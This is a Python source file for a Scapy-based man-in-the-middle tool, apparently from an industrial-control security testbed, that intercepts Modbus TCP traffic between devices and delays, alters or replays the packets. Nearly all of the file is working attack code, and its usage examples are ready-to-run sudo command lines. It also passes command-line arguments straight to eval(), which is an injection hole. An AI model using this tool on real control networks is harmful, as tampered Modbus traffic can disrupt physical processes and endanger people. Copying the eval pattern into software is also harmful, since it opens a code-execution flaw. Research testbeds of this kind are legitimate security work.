"""
This script implements a Man-In-The-Middle (MITM) attack on Modbus TCP communication using Scapy.
It captures, modifies, delays, and replays Modbus packets based on user-defined parameters.
Usage examples:
    sudo python3 mitm_modbus.py --rxif eth0 --txif eth1 --srcmac_n 00:30:a7:32:cb:52 00:1e:06:37:a1:a0 00:0e:c6:64:68:ee --dstmac_n 00:1e:06:37:a1:a0 00:0e:c6:64:68:ee --delay 0 --modif None --replay None
    sudo python3 mitm_modbus.py --rxif eth0 --txif eth1 --srcmac 00:30:a7:34:0a:67 18:31:bf:cf:28:69 --delay 0 --modif None --replay None
    sudo python3 mitm_modbus.py --rxif eth1 --txif eth0 --srcmac 00:30:a7:32:cb:52 --delay 0 --modif None --replay None
    sudo python3 mitm_modbus.py --rxif eth1 --txif eth0 --srcmac 00:30:a7:32:cb:52 --delay 0.0 --modif None --replay "['send_with_delay',0.5]"
Arguments:
    --rxif: List of RX interface names (default: ['eno1'])
    --txif: List of TX interface names (default: ['eno1'])
    --srcmac: List of source MAC addresses to sniff (default: [])
    --dstmac: List of destination MAC addresses to sniff (default: [])
    --srcmac_n: List of source MAC addresses not to sniff (default: [])
    --dstmac_n: List of destination MAC addresses not to sniff (default: [])
    --delay: Delay time to put in the path of packets (default: 0)
    --modif: Modification to be done on the packet (default: None)
    --replay: Replay packet instruction (default: None)
    --pcap: Name of the pcap file to read (default: None)
Functions:
    enable_ip_forwarding(): Enables IP forwarding on the system.
    disable_ip_forwarding(): Disables IP forwarding on the system.
    pkt_replay_queue_handler(): Handles packet replay tasks.
    pkt_delay_queue_handler(): Handles packet delay tasks.
    modbus_pkt_modify(pkt, _modif_command): Modifies Modbus packets based on the given command.
    pkt_modify_queue_handler(): Handles packet modification tasks.
    pkt_handler(pkt): Main packet handler function that processes and forwards packets.
    modbus_filter(pkt): Filter function for Modbus packets.
    mac_filter(pkt): Filter function for MAC addresses.
Main Execution:
    - Disables IP forwarding.
    - Starts handler threads for packet delay, modification, and replay.
    - Reads packets from a pcap file or sniffs packets from the specified interfaces.
    - Processes packets using the pkt_handler function.
"""



# import scapy.all as scapy
from scapy.all import *
import scapy.contrib.modbus as modbus
import argparse
from queue import Queue
from time import time, sleep
import os
import threading
from colorama import Fore, Back, Style
import random


# Example usage from others to sel3530:
# sudo python3 mitm_modbus.py --rxif eth0 --txif eth1 --srcmac_n 00:30:a7:32:cb:52 00:1e:06:37:a1:a0 00:0e:c6:64:68:ee --dstmac_n 00:1e:06:37:a1:a0 00:0e:c6:64:68:ee --delay 0 --modif None --replay None
# sudo python3 mitm_modbus.py --rxif eth0 --txif eth1 --srcmac 00:30:a7:34:0a:67 18:31:bf:cf:28:69 --delay 0 --modif None --replay None
# Example usage from SEL3530 to others:
# sudo python3 mitm_modbus.py --rxif eth1 --txif eth0 --srcmac 00:30:a7:32:cb:52 --delay 0 --modif None --replay None
# sudo python3 mitm_modbus.py --rxif eth1 --txif eth0 --srcmac 00:30:a7:32:cb:52 --delay 0.0 --modif None --replay "['send_with_delay',0.5]"

# Other Example usages:
# sudo python3 mitm_modbus.py --rxif eth0 --txif eth1 --srcmac 00:30:a7:34:0a:67 --delay 0 --modif None --replay None
# sudo python3 mitm_modbus.py --rxif eth1 --txif eth0 --srcmac 00:30:a7:32:cb:52 --delay 0 --modif None --replay None

# sudo python3 mitm_modbus.py --rxif eno1 --txif enx000ec66468ee --srcmac 00:30:a7:34:0a:67 --delay 0 --modif None --replay None
# sudo python3 mitm_modbus.py --rxif enx000ec66468ee --txif eno1 --srcmac 00:30:a7:32:cb:52 --delay 0 --modif None --replay None

# sudo python3 mitm_modbus.py --rxif eno1 --txif eno1 --srcmac 00:30:a7:34:0a:67 --pcap /home/tigr/ali_test/parser_test/Capture_03.10.2023_Everything.pcap
# sudo python3 mitm_modbus.py --rxif eno1 enx000ec66468ee --srcmac 00:30:a7:34:0a:67 00:30:a7:32:cb:52


parser = argparse.ArgumentParser(description='TRAPS MITM attacker')
parser.add_argument('--rxif', nargs='+', help='name of the RX interface', default=['eno1'])
parser.add_argument('--txif', nargs='+', help='name of the TX interface', default=['eno1'])
parser.add_argument('--srcmac', nargs='+', help='Source Mac address of the packets to sniff', default=[])
parser.add_argument('--dstmac', nargs='+', help='Destination Mac address of the packets to sniff', default=[])
parser.add_argument('--srcmac_n', nargs='+', help='Source Mac addresses of the packets not to sniff', default=[])
parser.add_argument('--dstmac_n', nargs='+', help='Destination Mac addresses of the packets not to sniff', default=[])
parser.add_argument('--delay', nargs='?', help='Delay time to put in path of packets', default=0)
parser.add_argument('--modif', nargs='?', help='Modification to be done on the packet', default=None)
parser.add_argument('--replay', nargs='?', help='replay packet instruction', default=None)
parser.add_argument('--pcap', nargs='?', help='name of the pcap file to read', default=None)
args = parser.parse_args()

Rx_IF = args.rxif
Tx_IF = args.txif[0]
pcap_file = args.pcap
srcmac = args.srcmac
dstmac = args.dstmac
srcmac_n = args.srcmac_n
dstmac_n = args.dstmac_n
delay_time = float(args.delay)
modif_command = eval(args.modif)
replay_command = eval(args.replay)
print("RX Interface: {}".format(Rx_IF))
print("TX Interface: {}".format(Tx_IF))
print("Pcap file: {}".format(pcap_file))
print("Source mac: {}".format(srcmac))
print("Destination mac: {}".format(dstmac))
print("Source mac not: {}".format(srcmac_n))
print("Destination mac not: {}".format(dstmac_n))
print("Delay time: {}".format(delay_time))
print("Modification command: {}".format(modif_command))
print("Replay command: {}".format(replay_command))

pkt_delay_queue = Queue()
pkt_modify_queue = Queue()
pkt_replay_queue = Queue()

#==============================================================================
# OS related functions

def enable_ip_forwarding():
    """
    Enables IP forwarding on the system.
    This function enables IP forwarding by writing '1' to the 
    /proc/sys/net/ipv4/ip_forward file. IP forwarding allows the system 
    to forward packets from one network interface to another, which is 
    typically required for network routing or man-in-the-middle attacks.
    Note:
        This function requires root privileges to modify the system 
        configuration.
    Raises:
        OSError: If the command to enable IP forwarding fails.
    """

    print("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forwarding():
    """
    Disables IP forwarding on the system by setting the value of 
    /proc/sys/net/ipv4/ip_forward to 0. This prevents the system from 
    forwarding IP packets, effectively disabling routing capabilities.
    Prints a message indicating that IP forwarding is being disabled.
    """

    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

#==============================================================================
# Packet handling functions

def pkt_replay_queue_handler():
    """
    Handles the packet replay queue by processing and sending packets based on replay commands.
    This function runs in an infinite loop, continuously checking the packet replay queue for new packets
    and their associated replay commands. When a packet and command are retrieved from the queue, it processes
    the command and sends the packet accordingly.
    Commands:
        - "send_with_delay": Sends the packet after a specified delay.
    The function handles the following steps:
        1. Retrieves a packet and its replay command from the queue.
        2. Parses the replay command and its value.
        3. If the command is "send_with_delay", calculates the delay and sends the packet after the delay.
        4. Marks the task as done in the queue.
    Note:
        - The function prints a message when it starts and after each replay task is done.
        - Any exceptions during the processing of the replay command are caught and ignored.
    Args:
        None
    Returns:
        None
    """

    print("Starting pkt_replay_queue_handler thread!")
    while True:
        # if pkt_replay_queue.empty() == False:
        [pkt,_replay_command] = pkt_replay_queue.get()
        try:
            replay_instruction = _replay_command[0]
            replay_value = float(_replay_command[1])
            if replay_instruction == "send_with_delay":
                sleep_time = pkt.time+replay_value-time()
                if(sleep_time > 0):
                    sleep(sleep_time)
                sendp(pkt, iface=Tx_IF, verbose=False)
        except:
            pass
        print("Replay task done with command: {}!".format(_replay_command))
        pkt_replay_queue.task_done()



def pkt_delay_queue_handler():
    """
    Handles the packet delay queue by processing and sending packets with a specified delay.
    This function runs in an infinite loop, retrieving packets from the pkt_delay_queue,
    calculating the required sleep time based on the packet's timestamp and the specified delay,
    and then sending the packet after the delay.
    Prints messages to indicate the start of the handler and the completion of each delay task.
    Note:
        - The function assumes that pkt_delay_queue is a global queue object containing packets and their respective delay times.
        - The function uses the global variables Tx_IF for the network interface and time() for the current time.
        - The function uses the sendp() function from the Scapy library to send packets.
    Raises:
        None
    Returns:
        None
    """

    print("Starting pkt_delay_queue_handler thread!")
    while True:
        # if pkt_delay_queue.empty() == False:
        [pkt,_delay_time] = pkt_delay_queue.get()
        # print(pkt.time+delay_time-time())
        sleep_time = pkt.time+_delay_time-time()
        if(sleep_time > 0):
            sleep(sleep_time)
        sendp(pkt, iface=Tx_IF, verbose=False)
        print("Delay task done with {}s delay!".format(_delay_time))
        pkt_delay_queue.task_done()




def modbus_pkt_modify(pkt, _modif_command):
    """
    Modifies a Modbus packet based on the provided modification command.
    Args:
        pkt: The Modbus packet to be modified.
        _modif_command (list): A list containing the modification command with the following elements:
            - attribute_name (str): The name of the attribute to be modified.
            - address_name (str or None): The name of the address attribute to check.
            - address_value: The value of the address attribute to match.
            - modify_value: The new value to set for the attribute.
    Returns:
        The modified Modbus packet if the modification conditions are met, otherwise the original packet.
    Raises:
        None. Any exceptions during modification are caught and handled internally.
    """
    
    try:
        # print(_modif_command)
        attribute_name = _modif_command[0]
        address_name = _modif_command[1]
        address_value = _modif_command[2]
        modify_value = _modif_command[3]
    except:
        return pkt
    try:
        if address_name != None and getattr(pkt, address_name, None) != address_value:
            return pkt
        else:
            # if hasattr(pkt, attribute_name):
            if getattr(pkt, attribute_name, None) != None:
                setattr(pkt, attribute_name, modify_value)
                if getattr(pkt, attribute_name, None) != modify_value:
                    print(Fore.RED + "Error: Failed to set the value for {}".format(attribute_name) + Style.RESET_ALL)
    except:
        print(Fore.RED + "Error: Failed to set the value for {}".format(attribute_name) + Style.RESET_ALL)
    return pkt



def pkt_modify_queue_handler():
    """
    Handles the modification of packets in a queue.
    This function runs in an infinite loop, retrieving packets from the 
    pkt_modify_queue, modifying them using the modbus_pkt_modify function, 
    and then sending the modified packets out on the specified interface.
    The function performs the following steps:
    1. Retrieves a packet and its modification command from the pkt_modify_queue.
    2. Modifies the packet using the modbus_pkt_modify function.
    3. Displays the modified packet.
    4. Sends the modified packet using the sendp function on the specified interface.
    5. Prints a message indicating the completion of the modification task.
    6. Marks the task as done in the pkt_modify_queue.
    Note: This function assumes that pkt_modify_queue, modbus_pkt_modify, 
    sendp, and Tx_IF are defined elsewhere in the code.
    Prints:
        str: A message indicating the start of the thread.
        str: A message indicating the completion of the modification task with the command used.
    """

    print("Starting pkt_modify_queue_handler thread!")
    while True:
        # if pkt_modify_queue.empty() == False:
        [pkt,_modif_command] = pkt_modify_queue.get()
        pkt = modbus_pkt_modify(pkt, _modif_command)
        pkt.show()
        sendp(pkt, iface=Tx_IF, verbose=False)
        print("modification task done with command : {}!".format(_modif_command))
        pkt_modify_queue.task_done()




def pkt_handler(pkt):
    """
    Handles incoming packets and processes them based on their type and content.
    Parameters:
    pkt (scapy.packet.Packet): The packet to be processed.
    The function performs the following actions:
    - Sends the packet immediately if it is not a Modbus request/response or a TCP packet with port 23.
    - If the packet is a Modbus request/response or a TCP packet with port 23, it processes the packet further.
    - If the packet is a TCP packet with source port 23 and the TCP flags are not "A", it adds the packet to the replay queue.
    - The function contains commented-out code for handling various Modbus PDU requests and responses, which can be uncommented and customized as needed.
    - Finally, the packet is sent using the specified network interface.
    Note:
    - The function uses global variables `Tx_IF`, `pkt_delay_queue`, `pkt_modify_queue`, and `pkt_replay_queue` which should be defined elsewhere in the code.
    - The function assumes the presence of the `modbus` module and its classes for Modbus ADU and PDU handling.
    """
    
    # pkt.show()
    # pkt_delay_queue.put([pkt, delay_time])
    # pkt_modify_queue.put([pkt, modif_command])
    # pkt_replay_queue.put([pkt, replay_command])
    # return

    send_now = True
    if (modbus.ModbusADURequest in pkt or modbus.ModbusADUResponse in pkt):
        send_now = False
    elif (TCP in pkt) and ((pkt[TCP].sport !=23) or (pkt[TCP].dport != 23)):
        send_now = False
    
    if send_now:
        sendp(pkt, iface=Tx_IF, verbose=False)
        return
    
    if (TCP in pkt) and (pkt[TCP].sport ==23) and (pkt[TCP].flags != "A"):
        # pkt.show()
        pkt_replay_queue.put([pkt, replay_command])
    
    # if modbus.ModbusPDU01ReadCoilsRequest in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU01ReadCoilsResponse in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU02ReadDiscreteInputsRequest in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU02ReadDiscreteInputsResponse in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU03ReadHoldingRegistersRequest in pkt:
    #     # print("Request packet sent")
    #     if bool(random.getrandbits(1)):
    #         pkt_delay_queue.put([pkt, delay_time])
    #         return
    #     # pkt.show()
    #     # pass
    # elif modbus.ModbusPDU03ReadHoldingRegistersResponse in pkt:
    #     # pkt_delay_queue.put([pkt, delay_time])
    #     # return
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU04ReadInputRegistersRequest in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU04ReadInputRegistersResponse in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU05WriteSingleCoilRequest in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU05WriteSingleCoilResponse in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU06WriteSingleRegisterRequest in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU06WriteSingleRegisterResponse in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU0FWriteMultipleCoilsRequest in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU0FWriteMultipleCoilsResponse in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU10WriteMultipleRegistersRequest in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU10WriteMultipleRegistersResponse in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU17ReadWriteMultipleRegistersRequest in pkt:
    #     # pkt.show()
    #     pass
    # elif modbus.ModbusPDU17ReadWriteMultipleRegistersResponse in pkt:
    #     # pkt.show()
    #     pass
    sendp(pkt, iface=Tx_IF, verbose=False)
    return

#==============================================================================
# Sniffing filters

def modbus_filter(pkt):
    """
    Filter function to identify Modbus ADU (Application Data Unit) packets.
    This function checks if the given packet is either a Modbus ADU Request or a Modbus ADU Response.
    Args:
        pkt: The packet to be checked.
    Returns:
        bool: True if the packet is a Modbus ADU Request or Response, False otherwise.
    """

    return modbus.ModbusADURequest in pkt or modbus.ModbusADUResponse in pkt


def mac_filter(pkt):
    """
    Filters packets based on MAC addresses.
    This function checks if the Ethernet layer is present in the packet and 
    applies a filter based on source and destination MAC addresses.
    Args:
        pkt (scapy.packet.Packet): The packet to be filtered.
    Returns:
        bool: True if the packet matches the filter criteria, False otherwise.
    Filter Criteria:
        - The source MAC address must be in the `srcmac` list or not in the `srcmac_n` list if `srcmac_n` is not empty.
        - The destination MAC address must be in the `dstmac` list or not in the `dstmac_n` list.
    """
    
    if Ether in pkt:
        return(((pkt[Ether].src in srcmac) or (not(pkt[Ether].src in srcmac_n) and len(srcmac_n)>0)) and ((pkt[Ether].dst in dstmac) or (not(pkt[Ether].dst in dstmac_n))))
        # if (pkt.sniffed_on == Rx_IF[0] and pkt[Ether].src==srcmac[0]) or (pkt.sniffed_on == Rx_IF[1] and pkt[Ether].src==srcmac[1]):
        #     return True
    return False

#==============================================================================

if __name__ == '__main__':

    # enable_ip_forwarding()
    disable_ip_forwarding()

    pkt_delay_queue_handler_thread = threading.Thread(target=pkt_delay_queue_handler, args=())
    pkt_modify_queue_handler_thread = threading.Thread(target=pkt_modify_queue_handler, args=())
    pkt_replay_queue_handler_thread = threading.Thread(target=pkt_replay_queue_handler, args=())
    pkt_delay_queue_handler_thread.start()
    pkt_modify_queue_handler_thread.start()
    pkt_replay_queue_handler_thread.start()


    if pcap_file!=None:
        pcap = PcapReader(pcap_file)
        for pkt in pcap:
            if mac_filter(pkt):
                pkt_handler(pkt)
    # pkt = sniff(iface=Rx_IF, filter='', prn=pkt_handler)
    pkt = sniff(iface=Rx_IF, lfilter=mac_filter, prn=pkt_handler)


    pkt_delay_queue_handler_thread.join()
    pkt_modify_queue_handler_thread.join()
    pkt_replay_queue_handler_thread.join()
